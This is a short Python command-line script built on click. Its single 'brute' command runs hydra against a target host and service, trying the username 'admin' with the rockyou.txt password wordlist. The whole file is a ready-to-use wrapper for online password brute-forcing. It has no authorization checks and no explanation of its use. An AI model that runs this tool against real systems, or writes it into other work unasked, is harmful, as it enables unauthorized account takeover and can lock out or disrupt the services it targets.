import click, subprocess
@click.group()
def cli(): pass
@cli.command()
@click.argument('target')
@click.argument('service')
def brute(target, service): subprocess.run(['hydra', '-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt', f'{target}', service])
if __name__ == '__main__': cli()
